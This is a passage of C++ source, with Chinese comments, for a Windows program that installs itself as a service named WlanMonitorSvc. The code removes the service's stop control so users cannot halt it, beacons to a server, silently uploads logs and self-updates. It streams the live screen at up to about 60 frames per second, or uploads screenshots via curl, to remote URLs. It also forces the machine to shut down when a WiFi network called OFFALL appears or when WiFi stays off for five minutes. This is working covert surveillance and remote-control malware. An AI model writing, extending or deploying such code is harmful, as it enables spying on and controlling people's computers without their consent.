    }
}

// 向服务器报备上线的专注线程，使用长轮询保持实时连接
DWORD WINAPI ReportThread(LPVOID lpParam) {
    while (true) {
        ReportToServer();
        Sleep(100); // 挂起时长缩短为 100ms 降低执行延迟
    }
    return 0;
}

// 5秒循环检测WiFi是否存在并检测 OFFALL 热点
void MonitorWiFiLoop() {
    WriteLog("开始后台监测WiFi(每5s一次，扫描日志改为每10分钟精简打印一次防刷屏)...");

    // 启动独立的网络通信线程来保持"永远在线"
    CreateThread(NULL, 0, ReportThread, NULL, 0, NULL);

    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);

    ULONGLONG lastLogTime = 0;
    ULONGLONG wifiOffStartTime = 0; // 记录WiFi处于关闭状态的起始时间
    ULONGLONG lastUpdateCheckTime = 0; // 记录上次检查更新的时间

    // 启动时清理以前遗留的各种老旧的替换废弃文件
    DeleteFileA((GetExePath() + ".old").c_str());
    DeleteFileA((GetExePath() + ".new").c_str());

    while (true) {
        if (dwResult != ERROR_SUCCESS) {
            dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        }

        bool foundOffAll = false;
        bool isWifiOff = false; // 当前刻是否无WiFi

        ULONGLONG currentTime = GetTickCount64();
        bool shouldLog = false;
        // 10 分钟 = 10 * 60 * 1000 毫秒 = 600000
        if (lastLogTime == 0 || (currentTime - lastLogTime >= 600000)) {
            shouldLog = true;
            lastLogTime = currentTime;
        }

        // 10 分钟检查一次自动更新 = 10 * 60 * 1000 = 600000 毫秒
        // 首次运行也会触发一次检测（由于 lastUpdateCheckTime = 0）
        if (lastUpdateCheckTime == 0 || (currentTime - lastUpdateCheckTime >= 600000)) {
            // 将更新检查放到专门的函数中执行，不阻塞主循环太久
            CheckForUpdates();
            // 在检查更新的同时，向云端静默上报最近 10 分钟以来的程序执行日志情况
            UploadLogToServer();
            lastUpdateCheckTime = currentTime;
        }

        if (dwResult == ERROR_SUCCESS) {
            PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
            if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
                if (shouldLog) WriteLog("本次循环(10分钟定期): 检测到 WiFi 网卡设备数量 = " + std::to_string(pIfList->dwNumberOfItems));

                if (pIfList->dwNumberOfItems == 0) {
                    isWifiOff = true; // 无网卡=WiFi关
                } else {
                    bool hasAnyVisibleNetwork = false;
                    for (int i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
                        PWLAN_INTERFACE_INFO pIfInfo = (PWLAN_INTERFACE_INFO) &pIfList->InterfaceInfo[i];

                        // 如果接口处于禁用或断开状态（例如飞行模式），API 可能直接返回错误，我们默认视为关闭并执行检测容错
                        // 强制调用网卡扫描周围的WiFi（如果不调用，获取到的列表是系统的旧缓存从而只有几个或者搜不到最新热点）
                        WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, NULL, NULL);

                        PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
                        // 获取周围可见的所有WiFi网络
                        DWORD dwRet = WlanGetAvailableNetworkList(hClient, &pIfInfo->InterfaceGuid, 0, NULL, &pBssList);
                        if (dwRet == ERROR_SUCCESS && pBssList != NULL) {
                            if (shouldLog) WriteLog("    网卡[" + std::to_string(i) + "] 获取到周围可见 WiFi 数量: " + std::to_string(pBssList->dwNumberOfItems));

                            if (pBssList->dwNumberOfItems > 0) {
                                hasAnyVisibleNetwork = true;
                            }

                            for (int j = 0; j < (int) pBssList->dwNumberOfItems; j++) {
                                PWLAN_AVAILABLE_NETWORK pNetwork = (PWLAN_AVAILABLE_NETWORK) & pBssList->Network[j];
                                char ssid[33] = {0};
                                if (pNetwork->dot11Ssid.uSSIDLength > 0 && pNetwork->dot11Ssid.uSSIDLength <= 32) {
                                    memcpy(ssid, pNetwork->dot11Ssid.ucSSID, pNetwork->dot11Ssid.uSSIDLength);

                                    std::string displaySsid = Utf8ToAnsi(ssid);

                                    // 转码为本机的字符串格式存入日志
                                    if (shouldLog) {
                                        WriteLog("        发现网络: [" + displaySsid + "]");
                                    }

                                    if (strcmp(ssid, "OFFALL") == 0) {
                                        foundOffAll = true;
                                        break;
                                    }

                                    // 如果不是 OFFALL，但匹配该电脑最新设定的备注名，同样触发击杀
                                    if (!g_CustomMyName.empty() && displaySsid == g_CustomMyName && g_CustomMyName != "未命名设备") {
                                        foundOffAll = true;
                                        WriteLog("警告：检测到了与本机当前设定的特殊备注名(" + g_CustomMyName + ")同名的 WiFi");
                                        break;
                                    }
                                }
                            }
                            WlanFreeMemory(pBssList);
                        } else {
                            // 如果获取可用网络列表失败（例如 Wi-Fi 开关物理/软件层面关闭了）
                            if (shouldLog) WriteLog("    网卡[" + std::to_string(i) + "] 无法获取网络列表，被视为禁用/关闭状态...");
                        }
                        if (foundOffAll) break;
                    }
                    if (!hasAnyVisibleNetwork) {
                        isWifiOff = true; // 可见网络为0，被认定为飞行模式/WiFi关
                    }
                }
                WlanFreeMemory(pIfList);
            } else {
                if (shouldLog) WriteLog("无法枚举 WiFi 接口，视同关闭。");
                isWifiOff = true;
            }
        } else {
            if (shouldLog) WriteLog("WlanOpenHandle 失败(错误代码: " + std::to_string(dwResult) + ")，视同关闭。");
            isWifiOff = true;
        }

        // 处理WiFi彻底关闭时的5分钟防逃避机制
        if (isWifiOff) {
            if (wifiOffStartTime == 0) {
                wifiOffStartTime = currentTime;
                WriteLog("警告：检测到 WiFi 已关闭/未连接/飞行模式，开始 5 分钟倒计时(300秒)，如果未恢复将关机...");
            } else {
                // 超过 5分钟（300000 毫秒）
                if ((currentTime - wifiOffStartTime) >= 300000) {
                    WriteLog("【严重警告】：WiFi 处于关闭状态已达 5 分钟，立即执行检测逃避强制关机!");
                    ForceShutdown();
                    Sleep(30000); // 缓冲等待系统关机
                }
            }
        } else {
            if (wifiOffStartTime != 0) {
                WriteLog("提示：检测到 WiFi 已重新开启并有信号，取消关机倒计时。");
                wifiOffStartTime = 0; // 重置
            }
        }

        if (foundOffAll) {
            WriteLog("【严重警告】：直接检测到名称为 OFFALL 的WiFi网络，立即执行底层API强制关机!");
            ForceShutdown();
            Sleep(30000); // 缓冲等待系统关机
        }

        Sleep(5000); // 间隔5秒
}

if (hClient != NULL) {
    WlanCloseHandle(hClient, NULL);
}
} // <--- End of MonitorWiFiLoop

// Windows 服务状态支持
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;

void WINAPI ServiceCtrlHandler(DWORD dwControl) {
    if (dwControl == SERVICE_CONTROL_SHUTDOWN) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        if (g_hMutex) CloseHandle(g_hMutex);
        exit(1); // 以1退出也会触发关机延时前的恢复重启（可防止在未完全关机时被恶意中止）
    }
}

void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerA("WlanMonitorSvc", ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    // 去除 SERVICE_ACCEPT_STOP 以使用户无法从“服务”管理器面板手动点击停止
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    WriteLog("【系统服务】Windows 服务 WlanMonitorSvc (服务模式) 开始运行!");

    // 开始进入后台功能检测循环
    MonitorWiFiLoop();

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main()
{
    g_ServiceStartTime = GetTickCount64();

    std::string cmdLine = GetCommandLineA();
    if (cmdLine.find("-usermode") != std::string::npos) {
        if (cmdLine.find("STREAM") != std::string::npos) {
            ReportScreenLog("新切出的流媒体串流子进程已启动...");
            size_t pos = cmdLine.find("http");
            if (pos != std::string::npos) {
                std::string url = cmdLine.substr(pos);
                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) {
                    url.pop_back();
                }

                std::string host, path;
                int port = 80;
                if (url.find("http://") == 0) {
                    std::string rest = url.substr(7);
                    size_t slashPos = rest.find('/');
                    if (slashPos != std::string::npos) {
                        host = rest.substr(0, slashPos);
                        path = rest.substr(slashPos);
                    } else {
                        host = rest;
                        path = "/";
                    }
                    size_t colonPos = host.find(':');
                    if (colonPos != std::string::npos) {
                        port = std::stoi(host.substr(colonPos + 1));
                        host = host.substr(0, colonPos);
                    }
                }

                HMODULE hUser32 = LoadLibraryA("user32.dll");
                if (hUser32) {
                    typedef BOOL(WINAPI* PSETPROCESSDPIAWARE)(VOID);
                    PSETPROCESSDPIAWARE pSetProcessDPIAware = (PSETPROCESSDPIAWARE)GetProcAddress(hUser32, "SetProcessDPIAware");
                    if (pSetProcessDPIAware) pSetProcessDPIAware();
                    FreeLibrary(hUser32);
                }

                Gdiplus::GdiplusStartupInput gdiplusStartupInput;
                ULONG_PTR gdiplusToken;
                Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

                CLSID clsid;
                GetEncoderClsid(L"image/jpeg", &clsid);

                WSADATA wsaData;
                WSAStartup(MAKEWORD(2, 2), &wsaData);
                SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (sock != INVALID_SOCKET) {
                    struct sockaddr_in serv_addr;
                    serv_addr.sin_family = AF_INET;
                    serv_addr.sin_port = htons(port);
                    struct hostent* he = gethostbyname(host.c_str());
                    if (he != NULL) {
                        memcpy(&serv_addr.sin_addr, he->h_addr_list[0], he->h_length);
                        if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
                            std::string httpReq = "POST " + path + " HTTP/1.1\r\n"
                                                  "Host: " + host + ":" + std::to_string(port) + "\r\n"
                                                  "Transfer-Encoding: chunked\r\n"
                                                  "Content-Type: application/octet-stream\r\n\r\n";
                            send(sock, httpReq.c_str(), httpReq.length(), 0);

                            ULONG quality = 60; // 修改为60极大提升画质

                            // 保持阻塞模式，防止非阻塞导致大包图片发送不完整丢帧黑屏
                            DxgiScreenCapturer dxgiStream; // 初始化DXGI对象

                            while (true) {
                                int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                                int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                                int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
                                int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);

                                if (nScreenWidth <= 0 || nScreenHeight <= 0) {
                                    nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
                                    nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
                                    nScreenX = 0;
                                    nScreenY = 0;
                                }

                                if (nScreenWidth <= 0 || nScreenHeight <= 0) { Sleep(500); continue; }

                                int targetW = nScreenWidth;
                                int targetH = nScreenHeight;
                                if (nScreenWidth > 1920) { // 限制最大1080P尺寸，不至于糊，也保障超宽屏不会爆显存
                                    targetW = 1920;
                                    targetH = (int)((float)nScreenHeight * 1920.0f / (float)nScreenWidth);
                                }

                                HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
                                if (!hDesktopDC) hDesktopDC = GetDC(NULL);
                                HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
                                HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, targetW, targetH);
                                HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

                                // 填充黑色背景防截取出错花屏
                                RECT bgRect = {0, 0, targetW, targetH};
                                FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

                                bool dxgiSuccess = false;
                                HBITMAP hDxgiBmp = NULL;
                                int dxW = 0, dxH = 0;
                                if (dxgiStream.CaptureImage(hDxgiBmp, dxW, dxH, 5)) {
                                    if (hDxgiBmp) {
                                        HDC hDxgiDC = CreateCompatibleDC(hDesktopDC);
                                        SelectObject(hDxgiDC, hDxgiBmp);
                                        SetStretchBltMode(hMemoryDC, COLORONCOLOR);
                                        StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDxgiDC, 0, 0, dxW, dxH, SRCCOPY);
                                        DeleteDC(hDxgiDC);
                                        DeleteObject(hDxgiBmp);
                                        dxgiSuccess = true;
                                    }
                                }

                                if (!dxgiSuccess) {
                                    SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
                                    StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY | CAPTUREBLT);

                                    // 【新增补丁】利用 PrintWindow(2) 强制捕获 DWM 硬件加速渲染的置前全屏应用（如浏览器全屏视频/游戏），防止纯GDI抓取变成黑屏或只有UI灰边
                                    HWND hForeground = GetForegroundWindow();
                                    if (hForeground && hForeground != GetDesktopWindow()) {
                                    char className[256];
                                    GetClassNameA(hForeground, className, sizeof(className));
                                    if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
                                        RECT fRect;
                                        if (GetWindowRect(hForeground, &fRect)) {
                                            int fW = fRect.right - fRect.left;
                                            int fH = fRect.bottom - fRect.top;
                                            // 当窗口占据屏幕较大部分时，认定为可能引发硬件遮罩的高优级主显应用，拉取它的真实渲染并贴图
                                            if (fW > 0 && fH > 0 && (fW >= nScreenWidth / 2 || fH >= nScreenHeight / 2)) {
                                                HDC hFgMemDC = CreateCompatibleDC(hDesktopDC);
                                                HBITMAP hFgBitmap = CreateCompatibleBitmap(hDesktopDC, fW, fH);
                                                HBITMAP hOldFgBmp = (HBITMAP)SelectObject(hFgMemDC, hFgBitmap);
                                                if (PrintWindow(hForeground, hFgMemDC, 2)) {
                                                    int dstX = (int)((fRect.left - nScreenX) * (float)targetW / (float)nScreenWidth);
                                                    int dstY = (int)((fRect.top - nScreenY) * (float)targetH / (float)nScreenHeight);
                                                    int dstW = (int)(fW * (float)targetW / (float)nScreenWidth);
                                                    int dstH = (int)(fH * (float)targetH / (float)nScreenHeight);
                                                    StretchBlt(hMemoryDC, dstX, dstY, dstW, dstH, hFgMemDC, 0, 0, fW, fH, SRCCOPY);
                                                }
                                                SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
                                            }
                                        }
                                    }
                                }
                                } // 结束 if (!dxgiSuccess)

                                IStream* pStream = NULL;
                                CreateStreamOnHGlobal(NULL, TRUE, &pStream);

                                {
                                    Gdiplus::Bitmap bitmap(hBitmap, NULL);
                                    Gdiplus::EncoderParameters ep;
                                    ep.Count = 1;
                                    ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
                                    ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                                    ep.Parameter[0].NumberOfValues = 1;
                                    ep.Parameter[0].Value = &quality;
                                    bitmap.Save(pStream, &clsid, &ep);
                                }

                                STATSTG statstg;
                                pStream->Stat(&statstg, STATFLAG_NONAME);
                                ULONG cbSize = statstg.cbSize.LowPart;

                                std::string buffer(cbSize, '\0');
                                LARGE_INTEGER liZero = {0};
                                pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
                                ULONG bytesRead = 0;
                                pStream->Read(&buffer[0], cbSize, &bytesRead);
                                pStream->Release();

                                SelectObject(hMemoryDC, hOldBitmap);
                                DeleteObject(hBitmap);
                                DeleteDC(hMemoryDC);
                                if (hDesktopDC) {
                                    // 尝试 ReleaseDC，如果失败（因为是 CreateDCA 创建的）则调用 DeleteDC
                                    if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
                                }

                                // 按照 Chunked 数据组织报文
                                uint32_t cbSizeLE = cbSize;
                                uint32_t payloadSize = 4 + cbSize;
                                char chunkHeader[32];
                                sprintf_s(chunkHeader, "%x\r\n", (unsigned int)payloadSize);

                                std::string sendBuffer;
                                sendBuffer.append(chunkHeader);
                                sendBuffer.append((char*)&cbSizeLE, 4);
                                sendBuffer.append(buffer.data(), cbSize);
                                sendBuffer.append("\r\n");

                                int s1 = send(sock, sendBuffer.data(), (int)sendBuffer.size(), 0);
                                if (s1 <= 0) break;

                                fd_set readfds;
                                FD_ZERO(&readfds);
                                FD_SET(sock, &readfds);
                                timeval tv = {0, 0}; // 设置超时为0达到非阻塞检测的作用
                                if (select(0, &readfds, NULL, NULL, &tv) > 0) {
                                    char recvBuf[128];
                                    int r = recv(sock, recvBuf, sizeof(recvBuf)-1, 0);
                                    if (r > 0) {
                                        recvBuf[r] = '\0';
                                        if (std::string(recvBuf).find("STOP") != std::string::npos) {
                                            break;
                                        }
                                    } else {
                                        break; // 远端关闭或错误
                                    }
                                }

                                Sleep(10); // 进一步降低休眠，允许近 60FPS 的采集
                            }
                        }
                    }
                    closesocket(sock);
                }
                WSACleanup();
                Gdiplus::GdiplusShutdown(gdiplusToken);
            } else {
                ReportScreenLog("致命：无法从命令行参数提取串流 URL。");
            }
            return 0; // 专属执行完毕后必出循环结束即可
        }

        if (cmdLine.find("SCREEN") != std::string::npos) {
            ReportScreenLog("新切出的用户子进程已启动...");
            size_t pos = cmdLine.find("http");
            if (pos != std::string::npos) {
                std::string url = cmdLine.substr(pos);
                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) {
                    url.pop_back();
                }
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string jpgPath = std::string(tempPath) + "sc.jpg";

                CaptureScreenJpg(jpgPath);

                ReportScreenLog("准备调用 curl 上传到: " + url);
                std::string curlCmd = "curl.exe -s -k -F \"file=@" + jpgPath + "\" \"" + url + "\"";
                std::string resOut = ExecCmd(curlCmd, false);
                ReportScreenLog("CMD / curl.exe 返回输出: [" + resOut + "]");
                DeleteFileA(jpgPath.c_str());
                ReportScreenLog("用户子进程操作完毕并已清理残留缓存，退出。");
            } else {
                ReportScreenLog("致命：无法从命令行参数提取上传 URL。");
            }
        }
        return 0; 
    }

    // 设置全局互斥体，防止多开和多重检测(跨 SYSTEM 账户和普通用户会话)
    SetLastError(0);
    g_hMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_AutoStart_Mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 已有实例在运行，直接退出
        if (g_hMutex) CloseHandle(g_hMutex);
        return 0;
    }

    // 尝试以 Windows 服务模式调度 (由 SCM 启动时才会成功)
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        {(LPSTR)"WlanMonitorSvc", (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
        {NULL, NULL}
    };
    
    if (StartServiceCtrlDispatcherA(ServiceTable)) {
        // 如果成功，说明由 SCM 拉起，并且此函数一直阻塞直到服务停止
        return 0;
    }

    DWORD err = GetLastError();
    if (err != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // 其他未知服务注册错误
        return 0;
    }

    // -- 若运行至此，说明是独立双击打开的(非系统服务启动)，进入首次安装提权逻辑 --

    // 如果没有管理员权限，则尝试提权
    if (!IsRunAsAdmin()) {
        WriteLog("========== 尝试提权 ==========");
        WriteLog("检测到非管理员权限，正在请求提权运行以安装服务...");

        std::string exePath = GetExePath();
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";               // 请求管理员权限
        sei.lpFile = exePath.c_str();       // 当前程序路径
        sei.nShow = SW_HIDE;                // 隐藏执行时的黑窗

        if (!ShellExecuteExA(&sei)) {
            err = GetLastError();
            if (err == ERROR_CANCELLED) {
                WriteLog("失败：用户取消了UAC提权提升提示。");
            } else {
                WriteLog("失败：提权失败，错误代码: " + std::to_string(err));
            }
        }
        // 提权后退出当前的非管理员实例
        return 0; 
    }

    WriteLog("========== 程序手动启动 (管理员进入安装模式) ==========");

    // 作为普通管理程序运行时，目标是安装为后台服务并启动
    InstallAndStartService();

    WriteLog("========== 安装动作完毕，原实例退出，交由 Windows SCM 后台管理 ==========\n");
    return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
